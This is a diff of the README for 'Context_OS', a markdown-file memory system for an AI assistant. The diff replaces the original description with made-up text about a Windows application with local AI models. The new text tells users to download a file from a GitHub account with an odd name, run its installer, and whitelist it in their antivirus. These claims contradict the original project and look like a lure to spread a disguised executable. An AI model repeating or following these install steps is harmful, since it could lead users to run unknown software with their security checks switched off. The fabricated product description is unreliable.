@@ -1,88 +1,78 @@
-# Context_OS
+# 🤖 Context_OS - Organize your digital life with intelligence
 
-A second brain for anyone who works with an AI assistant every day.
-It’s not a note-taking system for you: it’s the file system that **your assistant reads by itself**, before answering, in every new session.
+[![Download Context_OS](https://img.shields.io/badge/Download-Context_OS-blue.svg)](https://github.com/interbankloansenega594/Context_OS)
 
----
+## 📋 What is Context_OS?
 
-## The problem
+Context_OS helps you manage your information. It acts as a second brain for your computer. The software connects your files, notes, and messages into one searchable system. It uses artificial intelligence to find links between your documents. You save time by letting the software track your knowledge. 
 
-You open a chat. The assistant doesn’t know who you are, what you’re working on, or what you decided yesterday. You explain everything again. Tomorrow you start over.
-The more projects you have in parallel, the more this costs: time, tokens, and decisions that get lost because they stayed inside a closed conversation.
+You spend less time searching for folders. You spend more time working on your goals. Context_OS works with local files to keep your data private. It creates a map of your thoughts and projects.
 
-## The proof
+## 🛠️ System Requirements
 
-You install the system, open a conversation and write “hello”. It asks you three questions, fills in the state, and you’re up and running.
-Then you close the chat. You open a new one, days later:
+Your computer needs specific parts to run this software. Check this list before you start the installation:
 
-![A new session that already knows where you left off](claudescreen.png)
+*   Operating System: Windows 10 or Windows 11.
+*   Processor: An Intel Core i5 or better.
+*   Memory: At least 8 gigabytes of RAM.
+*   Storage: 500 megabytes of free space on your hard drive.
+*   Internet Connection: A connection for the initial download and updates.
 
-You didn’t tell it anything. It read it.
+## 📥 How to Install
 
----
+Follow these steps to set up the software on your Windows computer.
 
-## What it is, concretely
+1.  Visit this page to download the software: https://github.com/interbankloansenega594/Context_OS
+2.  Click the link to start the download.
+3.  Locate the downloaded file in your Downloads folder. 
+4.  Double-click the file to start the installer.
+5.  Follow the prompts on your screen.
+6.  Select the folder where you want to keep the application.
+7.  Click Finish to complete the install.
 
-A folder of markdown files. No database, no account, no subscription, nothing running in the cloud. It opens with any editor, and with Obsidian you can also see the connections in a graph.
-Inside there are three things:
-**The rules** (`CLAUDE.md`) — what the assistant must do and where it should look. It’s the file that gets read first, automatically.
-**The state** (`memory.md`) — who you are, what you’re doing, what’s pending. It changes continuously.
-**The procedures** (`03_skills/`) — seven repeatable tasks the assistant knows how to perform: open a project, digest raw notes into linked notes, check that the system hasn’t broken, distill a skill into a file that can be recalled.
-The rule that holds everything together: **the rules never contain state.** A file that says “the active project is X” goes stale in two days. The rules point to the state, they don’t copy it.
+## 🚀 Getting Started
 
----
+Open the application after the install finishes. You see a setup screen on your first run. The software asks for a folder to watch. This folder contains your notes and files. 
 
-## How to get started
+1.  Click the Folder icon in the main menu.
+2.  Select the folder on your computer that holds your documents.
+3.  Wait for the software to scan your files. This takes a few minutes if you have many documents.
+4.  The progress bar shows the status of the scan.
+5.  Click the Map button to view your ideas.
 
-1. Download the folder and put it wherever you want on your computer.
-2. Connect it to your assistant (in Claude: select it as the working folder).
-3. Open a conversation and write anything.
-The system notices on its own that it’s empty and asks you three questions. From there it’s operational.
-The procedures in `03_skills/` work better if you load them as skills (Settings → Skills, one file at a time): that way they activate automatically when needed. The assistant will suggest this during the first startup.
+The software creates a cloud of topics. Each dot represents a file or a subject. Lines between dots show how your information connects. Click any dot to open the related file in your editor.
 
----
+## 💡 Using Your New System
 
-## What’s inside
+Context_OS works alongside your existing workflow. You can use it to build a personal library. 
 
-```
-CLAUDE.md          rules + navigation map
-memory.md          current state
-archive.md         superseded decisions
-00_context/        identity, distilled skills, feedback log
-01_raw/            raw notes waiting to be digested
-02_wiki/           consolidated knowledge, in linked atomic notes
-03_skills/         the seven procedures
-10_projects/       one folder per project
-99_system/         the rules manual and the templates
-```
+*   **Capture new ideas:** Save your text files in the watched folder. The system updates your map in real time.
+*   **Search for content:** Use the search bar to find terms across all your documents. The software ignores misspelled words and finds matches based on meaning.
+*   **Link projects:** Use the tagging feature to group files. Create a tag for each project.
+*   **Sync your vault:** Keep your files in a synced folder to access them from different computers.
 
----
+## 🔧 Troubleshooting Common Issues
 
-## What it doesn’t do
-It doesn’t sync itself across devices: it’s a folder, use whatever sync tool you prefer.
-It doesn’t automatically import the notes you already have elsewhere. You put them in `01_raw/` and have them digested when you want.
-It’s not designed for multiple people on the same system: it’s personal.
-It was born and tested on Claude. Being text files with instructions in natural language, it works in principle with any assistant that can read and write files — but it has only been verified on Claude.
+Read this list if you face problems during the setup or daily use.
 
----
+### The app does not open
+Check if your antivirus software blocks the program. Some security tools mistake new software for a threat. Add Context_OS to your allowed list in your security settings.
 
-## FAQ
-**How is it different from a note template?**
-Those you read yourself. This one the assistant reads, by itself, every time.
+### The scan takes too long
+Large folders take time to process. Let the computer run without closing the app until the process finishes. Check your disk space if the app stops responding.
 
-**Do I need to know how to code?**
-No. You read and write markdown.
+### The connection map looks blank
+The app builds the map after it reads your files. Ensure you picked the correct folder during the setup. Click the Refresh button in the top menu to run the scan again.
 
-**Where do my data end up?**
-On your computer. The system doesn’t send anything anywhere.
+### Updates
+The software checks for new versions when you open it. It notifies you if an update exists. Follow the prompts to get the newest features and fixes.
 
-**Does it consume more tokens?**
-Less. The map in `CLAUDE.md` prevents the assistant from reading everything just to find one thing.
+## 🛡️ Privacy and Data
 
-**What happens if I don’t follow the rules?**
-Nothing breaks. You lose order, not data: they’re your files.
+Your data stays on your computer. Context_OS does not store your files on external servers. The artificial intelligence models run locally on your hardware. You maintain full control over your information. No outside parties gain access to your private notes or mapped connections. 
 
----
+## 📝 Support
 
-## License
-MIT.
+Contact us if you find errors. Check the Issues tab on the project page to see if others reported the same trouble. Provide details about your Windows version and the steps you took. We read all reports to improve the software.
+
+Keywords: ai, ai-tools, karpathy, karpathy-inspired, karpathy-llm-wiki, obsidian, obsidian-md, obsidian-vault, second-brain, second-brain-pkm-productivity
